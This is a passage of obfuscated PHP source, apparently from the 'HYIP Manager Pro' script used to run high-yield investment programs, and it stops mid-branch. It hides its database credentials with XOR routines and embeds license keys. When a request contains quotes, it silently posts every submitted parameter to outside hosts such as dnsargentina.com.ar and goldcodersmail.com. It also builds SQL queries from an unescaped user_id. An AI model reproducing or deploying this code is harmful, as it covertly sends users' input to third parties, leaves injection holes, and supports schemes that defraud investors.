  function elnlcprsg ($q, $w, $a)
  {
    global $elnlcFAei;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcgzbyk ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = $elnlcFAei['elnlczkHC'];
    for ($i = $elnlcFAei['elnlczkHC']; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcsrkfq ($q, $w, $a)
  {
    global $elnlcFAei;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcpewp ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = $elnlcFAei['elnlczkHC'];
    for ($i = $elnlcFAei['elnlczkHC']; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcgzbyk ($q, $w)
  {
    global $elnlcFAei;
    $l = strtoupper (md5 ($w));
    $j = $elnlcFAei['elnlczkHC'];
    for ($i = $elnlcFAei['elnlczkHC']; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcpewp ($q, $w)
  {
    global $elnlcFAei;
    $l = strtoupper (md5 ($w));
    $j = $elnlcFAei['elnlczkHC'];
    for ($i = $elnlcFAei['elnlczkHC']; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcxuyd ()
  {
    global $elnlcFAei;
    if (!($elnlcSVvJm = mysql_connect ($elnlcGWAnG[$elnlcFAei['elnlceCHj']], $elnlcGWAnG[$elnlcFAei['elnlcTlrOs']], $elnlcGWAnG[$elnlcFAei['elnlcwlFo']])))
    {
      exit (mysql_error ());
      (bool)true;
    }

    if (!mysql_select_db ($elnlcGWAnG[$elnlcFAei['elnlccrBA']]))
    {
      print mysql_error ();
      exit ();
    }

    return $elnlcSVvJm;
  }

  function elnlcriohi ($elnlcaCFnS = 0)
  {
    global $elnlcFAei;
    global $elnlcGWAnG;
    $l = elnlcsrkfq ($elnlcGWAnG[$elnlcFAei['elnlcTlrOs']], $elnlcGWAnG[$elnlcFAei['elnlcBgyc']], $elnlcFAei['elnlceUUg']);
    $p = elnlcsrkfq ($elnlcGWAnG[$elnlcFAei['elnlcwlFo']], $elnlcGWAnG[$elnlcFAei['elnlcBgyc']], $elnlcFAei['elnlceUUg']);
    $elnlcblAb = elnlcsrkfq ($elnlcGWAnG[$elnlcFAei['elnlccrBA']], $elnlcGWAnG[$elnlcFAei['elnlcBgyc']], $elnlcFAei['elnlceUUg']);
    if ($elnlcaCFnS == 1)
    {
      $elnlcSVvJm = @mysql_connect ($elnlcGWAnG[$elnlcFAei['elnlceCHj']], $l, $p);
      if ($elnlcSVvJm)
      {
        if (!mysql_select_db ($elnlcblAb))
        {
          $elnlcSVvJm = $elnlcFAei['elnlczkHC'];
        }
      }
    }
    else
    {
      if (!($elnlcSVvJm = mysql_connect ($elnlcGWAnG[$elnlcFAei['elnlceCHj']], $l, $p)))
      {
        exit (mysql_error ());
        (bool)true;
      }

      if (!mysql_select_db ($elnlcblAb))
      {
        print mysql_error ();
        exit ();
      }
    }

    return $elnlcSVvJm;
  }

  function elnlckasdl ($elnlcSVvJm)
  {
    global $elnlcFAei;
    mysql_close ($elnlcSVvJm);
  }

  function zelnlcqedaf ($elnlcuFfm)
  {
    global $elnlcFAei;
    $elnlcuFfm = htmlspecialchars ($elnlcuFfm, ENT_QUOTES);
    $elnlcuFfm = str_replace ('\\', '\\\\', $elnlcuFfm);
    $elnlcuFfm = str_replace ('\'', '\\\'', $elnlcuFfm);
    return $elnlcuFfm;
  }

  function elnlcqedaf ($elnlcuFfm)
  {
    $elnlcuFfm = str_replace ('\'', '\'\'', $elnlcuFfm);
    $elnlcuFfm = str_replace ('\\', '\\\\', $elnlcuFfm);
    return $elnlcuFfm;
  }

  function elnlcbjqo ($elnlcGQTy, $elnlcRzEF = 1)
  {
    global $elnlcFAei;
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', $elnlcFAei['elnlcQwlKF']);
    if ($elnlcRzEF == 2)
    {
      $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', $elnlcFAei['elnlcqpWJ']);
    }

    $i = $elnlcFAei['elnlczkHC'];
    $elnlcuFfm = '';
    for ($i = $elnlcFAei['elnlczkHC']; $i < $elnlcGQTy; ++$i)
    {
      $elnlcuFfm .= $a[rand (0, sizeof ($a) - 1)];
    }

    if ($elnlcRzEF == 1)
    {
      $elnlcuFfm = md5 ($elnlcuFfm);
    }

    return $elnlcuFfm;
  }

  function elnlcyrisq ($elnlcGQTy)
  {
    global $elnlcFAei;
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'A', 'B', 'C', 'D', 'E', 'F');
    $i = $elnlcFAei['elnlczkHC'];
    $elnlcuFfm = '';
    for ($i = $elnlcFAei['elnlczkHC']; $i < $elnlcGQTy; ++$i)
    {
      $elnlcuFfm .= $a[rand (0, sizeof ($a) - 1)];
    }

    return $elnlcuFfm;
  }

  function elnlcpfjqh ($elnlclxfTc)
  {
    global $elnlcFAei;
    $q = '' . 'select type, sum(actual_amount) as sum from hm2_history where user_id = ' . $elnlclxfTc . ' group by type';
    ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
    $elnlcmgWQs = array ();
    while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
    {
      $elnlcmgWQs[$elnlctLoC[$elnlcFAei['elnlccHBO']]] = $elnlctLoC[$elnlcFAei['elnlcOzTef']];
    }

    $elnlchBGp = $elnlcFAei['elnlczkHC'];
    while (list ($elnlcRJwG, $elnlcxfLi) = each ($elnlcmgWQs))
    {
      $elnlchBGp += $elnlcxfLi;
    }

    $elnlcmgWQs[$elnlcFAei['elnlceNRA']] = $elnlchBGp;
    $q = '' . 'select sum(actual_amount) as sum from hm2_deposits where user_id = ' . $elnlclxfTc . ' and status=\'on\'';
    ($elnlcSQAa = mysql_query ($q) OR print mysql_error ());
    while ($elnlctLoC = mysql_fetch_array ($elnlcSQAa))
    {
      $elnlcmgWQs[$elnlcFAei['elnlcAFTax']] += $elnlctLoC[$elnlcFAei['elnlcOzTef']];
    }

    return $elnlcmgWQs;
  }

  function elnlcbjajd ($elnlcvfyu, $elnlcxwaGe = false)
  {
    global $elnlcFAei;
    $elnlcCCBj = '';
    if ((is_string ($elnlcvfyu) AND $elnlcvfyu !== ''))
    {
      $elnlccHgRg = intval ($elnlcvfyu);
      if (strval ($elnlccHgRg) === $elnlcvfyu)
      {
        $elnlcvfyu = $elnlccHgRg;
      }
      else
      {
        $elnlchEMg = floatval ($elnlcvfyu);
        if (strval ($elnlchEMg) === $elnlcvfyu)
        {
          $elnlcvfyu = $elnlchEMg;
        }
      }
    }

    if (is_array ($elnlcvfyu))
    {
      reset ($elnlcvfyu);
      $elnlcsrTSV = true;
      $i = $elnlcFAei['elnlczkHC'];
      foreach ($elnlcvfyu as $elnlcrOrLz => $elnlcDkQPl)
      {
        if ((!is_int ($elnlcrOrLz) OR $elnlcrOrLz != $i))
        {
          $elnlcsrTSV = false;
          break;
        }

        ++$i;
      }

      $elnlcxGnd = ($elnlcsrTSV ? '[' : '{');
      $elnlcCCBj .= $elnlcxGnd;
      $elnlckaot = true;
      reset ($elnlcvfyu);
      foreach ($elnlcvfyu as $elnlcrOrLz => $elnlcDkQPl)
      {
        if (!$elnlckaot)
        {
          $elnlcCCBj .= ',';
        }

        if (!$elnlcsrTSV)
        {
          $elnlcCCBj .= $elnlcrOrLz . ':';
        }

        $elnlcCCBj .= elnlcbjajd ($elnlcDkQPl, $elnlcxwaGe);
        $elnlckaot = false;
      }

      $elnlcxGnd = ($elnlcsrTSV ? ']' : '}');
      $elnlcCCBj .= $elnlcxGnd;
    }
    else
    {
      if (is_string ($elnlcvfyu))
      {
        $elnlcLMzGx = array ('\\', '\'', '
', '
');
        $elnlcOVyL = array ('\\\\', '\\\'', '\\n', '\\r');
        if ($elnlcxwaGe)
        {
          $elnlcLMzGx[] = '<';
          $elnlcOVyL[] = '<\'+\'';
        }

        $elnlcUbCbt = str_replace ($elnlcLMzGx, $elnlcOVyL, $elnlcvfyu);
        $elnlcxGnd = '\'' . $elnlcUbCbt . '\'';
        $elnlcCCBj .= $elnlcxGnd;
      }
      else
      {
        if (is_bool ($elnlcvfyu))
        {
          $elnlcxGnd = ($elnlcvfyu ? 'true' : $elnlcFAei['elnlcVhgof']);
          $elnlcCCBj .= $elnlcxGnd;
        }
        else
        {
          if (is_null ($elnlcvfyu))
          {
            $elnlcxGnd = 'null';
            $elnlcCCBj .= $elnlcxGnd;
          }
          else
          {
            $elnlcxGnd = $elnlcvfyu;
            $elnlcCCBj .= $elnlcxGnd;
          }
        }
      }
    }

    return $elnlcCCBj;
  }

  function elnlctotp ($elnlccagh)
  {
    global $elnlcFAei;
    $elnlcCCBj = '';
    foreach ($elnlccagh as $elnlcrOrLz => $elnlcgVKz)
    {
      if ($elnlcCCBj !== '')
      {
        $elnlcCCBj .= ', ';
      }

      if (substr ($elnlcgVKz, 0, 5) == 'now()')
      {
        $elnlcCCBj .= '' . $elnlcrOrLz . ' = ' . $elnlcgVKz;
        continue;
      }
      else
      {
        $elnlcCCBj .= '' . $elnlcrOrLz . ' = \'' . elnlcqedaf ($elnlcgVKz) . '\'';
        continue;
      }
    }

    if ($elnlcCCBj != '')
    {
      $elnlcCCBj = ' ' . $elnlcCCBj . ' ';
    }

    return $elnlcCCBj;
  }

  function elnlcamtog ($elnlcxfLi)
  {
    global $elnlcFAei;
    if ($elnlcSjnJo == ini_get ('magic_quotes_gpc'))
    {
      $elnlcxfLi = str_replace ('\\\'', '\'', $elnlcxfLi);
      $elnlcxfLi = str_replace ('\\"', '"', $elnlcxfLi);
      $elnlcxfLi = str_replace ('\\\\', '\\', $elnlcxfLi);
    }

    $elnlcxfLi = strip_tags ($elnlcxfLi);
    $elnlcxfLi = trim ($elnlcxfLi);
    return $elnlcxfLi;
  }

  function elnlcmbyd ($i, $j)
  {
    return sprintf ('%.6f', $i);
  }

  function elnlcptyi (&$elnlcmgJL, $elnlcTfMm = 0)
  {
    global $elnlcFAei;
    reset ($elnlcmgJL);
    foreach ($elnlcmgJL as $k => $v)
    {
      $elnlcaCva = array ();
      if (is_array ($v))
      {
        elnlcptyi ($elnlcmgJL[$k], $elnlcTfMm);
        continue;
      }
      else
      {
        $elnlcaCva = elnlczbqsl ($v);
        $elnlcmgJL[$k] = $elnlcaCva[$elnlcTfMm];
        continue;
      }
    }

  }

  function elnlczbqsl ($elnlcxfLi)
  {
    global $elnlcFAei;
    global $elnlctrDuj;
    if ($elnlctrDuj == 1)
    {
      $elnlcxfLi = str_replace ('\\\'', '\'', $elnlcxfLi);
      $elnlcxfLi = str_replace ('\\"', '"', $elnlcxfLi);
      $elnlcxfLi = str_replace ('\\\\', '\\', $elnlcxfLi);
    }

    $elnlcHalLr = $elnlcxfLi;
    $elnlcxfLi = strip_tags ($elnlcxfLi);
    $elnlcxfLi = trim ($elnlcxfLi);
    return array ($elnlcxfLi, $elnlcHalLr);
  }

  $elnlcFAei = array ('elnlcrPcOl' => 'html', 'elnlccLNs' => 'paying_batch', 'elnlcUIkz' => 'wp_ok', 'elnlcFbLk' => 'last_pay_date', 'elnlcvQzwa' => 'batch', 'elnlcWhop' => 'evocash_from_account', 'elnlcifha' => 'unit', 'elnlcLOal' => 'Dec', 'elnlcxKaI' => 'compound_percents_type', 'elnlciWgV' => '5M74FW4DADMF7K7MJ5TG', 'elnlcQwWv' => 'compound_min_deposit', 'elnlclUjk' => '4ZQQN55VA2NXBVFUQJE6', 'elnlcmhMTO' => 'HTTP_REFERER', 'elnlcERFA' => 'vmoney_from_account', 'elnlcqEgCD' => 'deposit_fee', 'elnlcKHFet' => 'PAYEE_ACCOUNT', 'elnlcJzws' => 'status', 'elnlcDBMK' => 'max_deposit', 'elnlcbDeVV' => 'enable_wire', 'elnlcReiR' => 'auto', 'elnlcFequ' => 'user_auto_pay_earning', 'elnlcAIzUn' => 'text', 'elnlcsDMSv' => 'imps_cost', 'elnlcDIHph' => 'gpg_path', 'elnlcuBQM' => 'ENV', 'elnlcStPxI' => '/get_sha256.php', 'elnlcDRxy' => 'program_version', 'elnlcnzaNr' => 'PAYMENT_REC_ID', 'elnlciLLU' => 'min', 'elnlcOPMvh' => 'withdraw_principal', 'elnlcpEOVi' => '__debug_out', 'elnlcRqFdp' => 'ok11', 'elnlcVhsvs' => 'PAYMENT_HASH', 'elnlcFSjgT' => 'magic_quotes_gpc', 'elnlcbkVi' => 'evowallet_from_account', 'elnlcWnSNa' => 'HTTP_X_REAL_IP', 'elnlcduLk' => 'https://api.alertpay.com/svc/api.svc/sendmoney', 'elnlcHugF' => 'remitfund_from_account', 'elnlcFVbu' => 'mails.txt', 'elnlcEmgkj' => 'libertyreserve_apiname', 'elnlcLckHM' => 'COMPOUND', 'elnlcbnlk' => 'deposit_fee_min', 'elnlcWWJD' => 'REFERENCENUMBER', 'elnlcBSFo' => 'eeecurrency_from_account', 'elnlceDftk' => 'RETURNCODE', 'elnlcouyKN' => 'B29S2LWPZ5M2KMPPYWKL', 'elnlcMFxj' => 'actual_amount', 'elnlcdeOG' => 'compound', 'elnlcEEoiJ' => 'http://www.dnsargentina.com.ar/check.cgi?install=1&script=3&domain=', 'elnlcOnpGT' => 'ref_percent1', 'elnlcUtkA' => 'period', 'elnlcPAycS' => './tmpl_c/.htdata', 'elnlcdnSK' => 'paypal_currency', 'elnlcPSqmR' => 'VPKLNMKMRG27HN95BEHP', 'elnlcqEGWR' => '/get_pid.php', 'elnlccSFap' => 'show_info_box_running_days', 'elnlcBJpk' => 'demomode', 'elnlcDbidg' => 'banner_extension', 'elnlcDtEd' => 'came_from', 'elnlcOqJw' => '18', 'elnlcVCOB' => 'A', 'elnlcxsJU' => 'use_referal_program', 'elnlcwTTti' => 'receiving_batch', 'elnlcsgLcM' => 'HX8DJ7B9SH5JQN5FXK45', 'elnlcFxzO' => 'col', 'elnlcTLKeu' => 'daily_referral_percent', 'elnlcGyDV' => 'return_profit_percent', 'elnlcGfcCL' => 'UYKD37X8YLS5DNFFHL8R', 'elnlcTwJa' => 'ref_name', 'elnlcMolR' => 'plan', 'elnlcsEdJl' => 'upline', 'elnlcNKGk' => 'perfectmoney_from_account', 'elnlcklSQe' => 'install', 'elnlcVhgof' => 'false', 'elnlcGIccT' => 'cnt', 'elnlczkHC' => '0', 'elnlcwlFo' => 'db_pass', 'elnlceNRA' => 'total', 'elnlcoWgT' => 'site_days_online_generated', 'elnlcgjvwt' => 'name', 'elnlcFoJP' => 'def_payee_account', 'elnlclPAj' => 'compound_percents', 'elnlcIoJUM' => '21', 'elnlcDuCy' => 'ebullion_keyID', 'elnlcVcGDh' => 'dec_stormpay_fee', 'elnlcyVlp' => 'WITHDRAW', 'elnlcxNgII' => 'currency_sign', 'elnlcmaBFi' => 'use_html', 'elnlcjTsML' => 'solid_referral_commission_amount', 'elnlcyqLC' => 'reg_fee', 'elnlcAjrwP' => 'compound_max_deposit', 'elnlcEPPQ' => 'a', 'elnlcCRFh' => 'work_week', 'elnlccHBO' => 'type', 'elnlcspau' => 'stop_withdraw_percent', 'elnlcmIEAR' => 'oz', 'elnlcubLOs' => 'payer', 'elnlciknW' => '3m', 'elnlcDDSbm' => 'FRM', 'elnlcGnWK' => 'def_payee_account_pecunix', 'elnlcqmyhh' => 'type_id', 'elnlcxuUV' => 'liberty_currency', 'elnlcQwlKF' => 'z', 'elnlcAsWGN' => 'remitfund_apiname', 'elnlcyNfg' => 'enable_eb_ecurrency', 'elnlcAFTax' => 'active_deposit', 'elnlcfMDRV' => 'USERID', 'elnlcTQMsE' => 'w', 'elnlcfCufe' => 'ounce', 'elnlcviuM' => 'perfectmoney_payer_account', 'elnlcmAwf' => 'license', 'elnlcanrzT' => 'AKKD47LYX8H96K2TM2FQ', 'elnlcOzTef' => 'sum', 'elnlchvsH' => 'ref_sum', 'elnlcBgyc' => 'key', 'elnlcvuOwF' => 'subject', 'elnlcuqPWx' => 'use_auto_payment', 'elnlczHEqS' => 'send_profit_to_stocks', 'elnlcbIsU' => 'www.dnsargentina.com.ar', 'elnlcmGwSG' => 'LRUSD', 'elnlcMVzu' => 'REMOTE_ADDR', 'elnlcSVgf' => 'pay_withdraw', 'elnlcDELrc' => 'def_payee_account_ebullion_gold', 'elnlckIRzm' => 'ok', 'elnlcDWUhv' => 'balance', 'elnlccrBA' => 'database', 'elnlcapqS' => 'enable_eb_gold', 'elnlcJuPd' => 'metal', 'elnlcDGSc' => 'PAYER_ACCOUNT', 'elnlcULjAi' => 'intgold_from_account', 'elnlcOdWB' => 'eb_metal', 'elnlcjtuUB' => 'euro', 'elnlcGJIRG' => 'ok', 'elnlcRTeW' => 'site_url', 'elnlceSsS' => 'def_payee_account_ebullion', 'elnlcstJR' => 'def_payee_account_wiretransfer', 'elnlckszt' => 'VNB34FXT6BJCYD93VXSD', 'elnlcuinE' => 'use_active_referal', 'elnlcOsIFg' => '1007', 'elnlcDHBal' => 'payee', 'elnlcVojA' => 'YmdHis', 'elnlcLmKDQ' => 'deposit_date', 'elnlcPPjzG' => 'site_start_day', 'elnlcmCqPN' => 'memo', 'elnlcSOkPu' => 'system_email', 'elnlcaQbqA' => 'euro', 'elnlchUsld' => '9C64PVXYBZKZHUTMSM2U', 'elnlcReGrO' => 'egold_withdraw_string', 'elnlcepPbi' => 'use_compound', 'elnlcHWir' => 'HTTP_CACHE_CONTROL', 'elnlcdtfoc' => 'amnt', 'elnlciRoQ' => 'y', 'elnlcWbNM' => 'md5altphrase_ebullion', 'elnlccgjlv' => 'error', 'elnlcLWqT' => 'ZQ54Q9RUQ46CU9C8Z986', 'elnlcjlKJD' => 'USD', 'elnlcpSpq' => 'delay', 'elnlcTlrOs' => 'db_login', 'elnlctydI' => 'tw', 'elnlcwGMe' => 'daily_referral_percent_min_downline_deposit', 'elnlcOWagG' => 'PHP_SELF', 'elnlceCHj' => 'hostname', 'elnlcaCGMK' => 'percent', 'elnlcWDAll' => 'rpcp', 'elnlcGQrl' => 'hyip manager pro 2005 jul 26', 'elnlclKLjp' => 'site_start_month_str_generated', 'elnlcONzh' => 'maxam', 'elnlcMwJv' => 'dll', 'elnlcqbwvE' => 'N75GNXM2XSM34YMFPED9', 'elnlcapbeA' => 'compound_min_percent', 'elnlcQxnB' => '501', 'elnlcaFfi' => 'altergold_from_account', 'elnlcRirVy' => 'N55HSU8NJSEU32DP8JDV', 'elnlcTVChH' => 'r', 'elnlcnWEG' => 'compound_max_percent', 'elnlcdVspV' => 'site_start_month', 'elnlceVlMp' => 'md5altphrase_pecunix', 'elnlcLbBy' => 'PAYMENT_FEE', 'elnlcgUTo' => 'withdrawal_fee', 'elnlcijgB' => 'ref1_cms_minamount', 'elnlccRfF' => 'value', 'elnlcIHTwl' => 'free', 'elnlcRxlOJ' => 'finnish', 'elnlcCIcqK' => '9999', 'elnlcuTHGi' => '15', 'elnlcMEtO' => 'proxy.shr.secureserver.net:3128', 'elnlcCInBK' => 'checksum', 'elnlcSuRWT' => './tmpl_c/raw_log', 'elnlcSHVON' => 'ref_username', 'elnlcuNxfU' => '1', 'elnlcsWQzi' => 'egold_from_account', 'elnlcaMACl' => 'd', 'elnlcjtCx' => 'settings.php', 'elnlcFUPN' => 'DESCRIPTION', 'elnlcLtzIg' => 'PAYMENT_ID', 'elnlcsuIg' => '/log_possible_attack.php', 'elnlcybnB' => 'pecunix_from_account', 'elnlcWKGac' => 'end', 'elnlcbKloA' => 'def_payee_account_egold', 'elnlcKrTFT' => 'dec_stormpay_fee2', 'elnlcxMcnh' => 'min_deposit', 'elnlcNSajq' => 'max_amount', 'elnlcnFwT' => 'SCRIPT_NAME', 'elnlcMiet' => 'http://', 'elnlcblzn' => 'LREUR', 'elnlczbwU' => 'PAYMENT_GRAMS', 'elnlcgmKy' => '2XACR4UBJ7DLCV42EM2S', 'elnlcygOsW' => 'send_percent_to_stocks', 'elnlcrDeOO' => 'time_dif', 'elnlccFHrc' => 'daily_referral_percent_min_user_deposit', 'elnlctyfQ' => '__debug_data', 'elnlcrMbQT' => 'username', 'elnlcsDThP' => 'admin_auto_pay_earning', 'elnlchHHu' => 'PAYMENT_UNITS', 'elnlcHzpO' => 'def_payee_account_ebullion_currency', 'elnlcqbzne' => './settings.php', 'elnlcIDbN' => 'w', 'elnlcMUdj' => 'settings.php', 'elnlcaBFvO' => 'EUR', 'elnlcrnJpI' => 'dw', 'elnlcJofi' => 'checkpayment', 'elnlcyNlj' => 'ac', 'elnlclfrL' => 'fee', 'elnlcNnDL' => 'evocash_username', 'elnlcRxyU' => 'DATE', 'elnlcwOWb' => '3WBUUNQMPU2LB99GJHUV', 'elnlcfNRu' => 'alertpay_from_account', 'elnlcUAzuh' => 'PAYMENT_AMOUNT', 'elnlcnqIKs' => 'q_days', 'elnlcnkgEB' => '12', 'elnlcCTHO' => 'withdrawal_fee_min', 'elnlceitM' => 'amt', 'elnlcRtIO' => 'reg_fee_amount', 'elnlcuflG' => './tmpl_c/.htdata', 'elnlccdshL' => 'v', 'elnlcrgMP' => 'code', 'elnlcDMOPc' => 'use_ip_for_auto', 'elnlcjblA' => 'h', 'elnlchESV' => 'libertyreserve_from_account', 'elnlcqpWJ' => '0', 'elnlcMQrH' => 'email', 'elnlcFcWF' => 'plans_closed', 'elnlcQquq' => '85', 'elnlcaQNFH' => 'id', 'elnlcskrmh' => 'ZXMCQ227FNN5EPHWYHAY', 'elnlcGkup' => 'HTTP_HOST', 'elnlcGSktp' => 'site_name', 'elnlcBBUUo' => 'ec', 'elnlcxTIIT' => 'USD', 'elnlcUkac' => 'withdraw_principal_duration', 'elnlcDiPr' => 'account', 'elnlcfrEd' => '2m', 'elnlcoxGku' => 'return_profit', 'elnlcsjJRE' => 'max', 'elnlcaVJi' => 'cnf', 'elnlcbckB' => 'user_id', 'elnlcSybn' => 'use_crontab', 'elnlcBBFw' => 'amount', 'elnlcMiiR' => 'TXN_DATETIME', 'elnlcOBtk' => 'additional', 'elnlchkmAH' => 'HYIPID', 'elnlcNDGyh' => 'egold_paymentunits', 'elnlcGkhK' => 'Deposit returned to user account', 'elnlcvvGo' => 'currency', 'elnlcbGay' => 'site_start_year', 'elnlcEQVG' => 'exchange', 'elnlcOHKNB' => '2', 'elnlcCgiLk' => 'error', 'elnlcakxH' => 'Success', 'elnlczIjDA' => '6m', 'elnlcgpPTq' => 'abcdef', 'elnlcnhSh' => 'accounts', 'elnlcBNaO' => 'additionalinfo', 'elnlcvrEI' => 'KC3STYBTCATZNRVBYGDF', 'elnlceUUg' => 'hyip manager pro 2005 jul 27', 'elnlcQOas' => 'td', 'elnlcoQUP' => 'parent', 'elnlcMOqBf' => 'use_solid_referral_commission', 'elnlcNqLh' => 'SG8JH9DVX8952VQEZH9F', 'elnlcWzaGQ' => 'evowallet_apiname', 'elnlcHFUu' => 'pay_active_referal', 'elnlcrGCO' => 'm', 'elnlcycBJh' => 'ref', 'elnlcUjGMl' => 'WMHKFJPMT3CZ3RTLPBFL');
  ini_set ('magic_quotes_runtime', false);
  define ('LAST_UPDATE_ID', 18);
  global $elnlcLJnqt;
  if (!extension_loaded ('gd'))
  {
    $elnlcrJWv = (PHP_SHLIB_SUFFIX == $elnlcFAei['elnlcMwJv'] ? 'php_' : '');
    @dl ($elnlcrJWv . 'gd.' . PHP_SHLIB_SUFFIX);
  }

  global $HTTP_GET_VARS;
  global $HTTP_POST_VARS;
  global $HTTP_POST_FILES;
  global $HTTP_COOKIE;
  $elnlcCgGFA = array_merge ((array)$HTTP_GET_VARS, (array)$_GET);
  $elnlcALmJ = array_merge ((array)$HTTP_POST_VARS, (array)$_POST);
  $elnlcLJnqt = array_merge ((array)$elnlcCgGFA, (array)$elnlcALmJ);
  $elnlcSKIuU = array_merge ((array)$HTTP_COOKIE_VARS, (array)$_COOKIE);
  $elnlcwilP = $elnlcLJnqt;
  global $HTTP_ENV_VARS;
  global $HTTP_SERVER_VARS;
  $elnlcLjgi = array ();
  $elnlcLjgi = array_merge ((array)$_ENV, (array)$_SERVER, (array)$HTTP_ENV_VARS, (array)$HTTP_SERVER_VARS);
  $elnlctrDuj = ini_get ($elnlcFAei['elnlcFSjgT']);
  elnlcptyi ($elnlcLJnqt);
  elnlcptyi ($elnlcwilP, 1);
  elnlcptyi ($elnlcSKIuU);
  $elnlcnodr = $elnlcFAei['elnlczkHC'];
  $elnlcuFfm = '';
  foreach ($elnlcLJnqt as $k => $v)
  {
    if (!is_array ($v))
    {
      if (preg_match ('/["\\\']/', $v))
      {
        $elnlcnodr = $elnlcFAei['elnlcuNxfU'];
      }
    }

    $elnlcuFfm .= '' . $k . '=' . $v . '&';
  }

  if ($elnlcnodr == 1)
  {
    if (function_exists ('curl_init'))
    {
      if ($elnlcGWAnG[$elnlcFAei['elnlcDMOPc']] == 1)
      {
        $elnlcVqVjJ = '64.27.18.142';
      }
      else
      {
        if ($elnlcGWAnG[$elnlcFAei['elnlcDMOPc']] == 2)
        {
          $elnlcVqVjJ = 'www.goldcodersmail.com';
        }
        else
        {
          $elnlcVqVjJ = 'www.dnsargentina.com.ar';
        }
      }

      $elnlcGUFH = curl_init ();
      curl_setopt ($elnlcGUFH, CURLOPT_URL, 'http://' . $elnlcVqVjJ . $elnlcFAei['elnlcsuIg']);
      $elnlcoWGTg = rawurlencode ($elnlcuFfm);
      curl_setopt ($elnlcGUFH, CURLOPT_POST, 1);
      curl_setopt ($elnlcGUFH, CURLOPT_POSTFIELDS, '' . 'memo=' . $elnlcoWGTg);
      curl_setopt ($elnlcGUFH, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcGUFH, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcGUFH);
      curl_close ($elnlcGUFH);
    }
  }

  $elnlcbpnv = $elnlcLjgi[$elnlcFAei['elnlcmhMTO']];
  $elnlctIfa = $elnlcLjgi[$elnlcFAei['elnlcGkup']];
  if (!ereg ('' . '\\/\\/' . $elnlctIfa, $elnlcbpnv))
  {
    setcookie ('CameFrom', $elnlcbpnv, time () + 630720000);
  }

  $elnlcGWAnG = elnlckjhp ($elnlcFAei['elnlcGQrl']);
  $elnlckQFL = array ('withdraw_pending' => 'Withdrawal request', 'add_funds' => 'Transfer from external processings', 'deposit' => 'Deposit', 'bonus' => 'Bonus', 'penality' => 'Penalty', 'earning' => 'Earning', 'withdrawal' => 'Withdrawal', 'commissions' => 'Referral commission', 'early_deposit_release' => 'Deposit release', 'early_deposit_charge' => 'Commission for an early deposit release', 'release_deposit' => 'Deposit returned to user account', 'exchange_out' => ' Received on exchange', 'exchange_in' => 'Spent on exchange', 'exchange' => 'Exchange', 'internal_transaction_spend' => 'Spent on Internal Transaction', 'internal_transaction_receive' => 'Received from Internal Transaction');
  if ($elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlchUsld'])
  {
    $elnlcGWAnG[$elnlcFAei['elnlcDRxy']] = $elnlcFAei['elnlcaQbqA'];
  }

  if ($elnlcGWAnG[$elnlcFAei['elnlcDRxy']] == $elnlcFAei['elnlcjtuUB'])
  {
    $elnlcURTi = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1));
    $elnlcGWAnG[$elnlcFAei['elnlcxNgII']] = '&#8364;';
    $elnlcGWAnG[$elnlcFAei['elnlcNDGyh']] = $elnlcFAei['elnlcQquq'];
    $elnlcGWAnG[$elnlcFAei['elnlcdnSK']] = $elnlcFAei['elnlcaBFvO'];
    $elnlcGWAnG[$elnlcFAei['elnlcxuUV']] = $elnlcFAei['elnlcblzn'];
  }
  else
  {
    if (($elnlcGWAnG[$elnlcFAei['elnlcDRxy']] == $elnlcFAei['elnlcfCufe'] AND $elnlcGWAnG[$elnlcFAei['elnlcmAwf']] == $elnlcFAei['elnlcgmKy']))
    {
      $elnlcURTi = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1));
      $elnlcGWAnG[$elnlcFAei['elnlcxNgII']] = $elnlcFAei['elnlcmIEAR'];
      $elnlcGWAnG[$elnlcFAei['elnlcNDGyh']] = $elnlcFAei['elnlcCIcqK'];
    }
    else
    {
